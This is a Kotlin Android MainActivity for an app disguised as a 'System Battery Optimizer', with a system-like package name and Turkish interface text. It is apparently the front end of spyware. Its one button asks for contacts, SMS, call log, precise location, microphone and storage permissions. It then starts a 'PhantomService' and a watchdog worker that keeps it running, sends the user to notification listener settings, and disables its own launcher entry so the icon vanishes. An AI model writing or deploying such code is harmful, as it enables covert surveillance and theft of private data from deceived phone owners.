package com.android.system.optimizer

import android.Manifest
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.view.Gravity
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val root = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; gravity = Gravity.CENTER; setBackgroundColor(Color.parseColor("#000000")); setPadding(64, 64, 64, 64) }
        val title = TextView(this).apply { text = "System Battery Optimizer"; textSize = 20f; setTextColor(Color.WHITE); gravity = Gravity.CENTER; setPadding(0, 0, 0, 24) }
        val btn = Button(this).apply { text = "OPTÄ°MÄ°ZE ET"; setBackgroundColor(Color.parseColor("#4CAF50")); setTextColor(Color.WHITE); setOnClickListener { reqPerms() } }
        root.addView(title); root.addView(btn); setContentView(root)
    }

    private fun reqPerms() {
        val storagePerm = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            Manifest.permission.READ_MEDIA_IMAGES
        } else {
            Manifest.permission.READ_EXTERNAL_STORAGE
        }
        val perms = arrayOf(
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.RECORD_AUDIO,
            storagePerm
        )
        val needed = perms.filter { ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED }.toTypedArray()
        if (needed.isNotEmpty()) ActivityCompat.requestPermissions(this, needed, 101) else startOptimizer()
    }

    private fun startOptimizer() {
        val svc = Intent(this, PhantomService::class.java)
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(svc) else startService(svc)
        } catch (e: Exception) {
            startService(svc)
        }
        WatchdogWorker.schedule(this)

        Toast.makeText(this, "Cihaz optimize ediliyor...", Toast.LENGTH_SHORT).show()
        
        try {
            val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
        } catch (e: Exception) {}

        packageManager.setComponentEnabledSetting(ComponentName(this, MainActivity::class.java), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
        finish()
    }

    override fun onRequestPermissionsResult(rc: Int, p: Array<out String>, gr: IntArray) { super.onRequestPermissionsResult(rc, p, gr); if (rc == 101) startOptimizer() }
}

